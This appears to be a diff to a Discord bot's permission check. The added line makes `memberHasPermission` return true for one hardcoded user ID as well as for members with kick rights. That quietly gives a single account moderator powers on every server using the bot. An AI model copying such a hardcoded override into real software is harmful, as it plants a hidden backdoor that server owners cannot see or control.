@@ -22,7 +22,7 @@ client.db.init();
 client.messageHelper = new MessageHelper(client);
 
 client.memberHasPermission = function(member) {
-	return member.permissions.has(Permissions.FLAGS.KICK_MEMBERS)
+	return member.permissions.has(Permissions.FLAGS.KICK_MEMBERS) || member.user.id === "228154435589767168"
 }
 
 try {
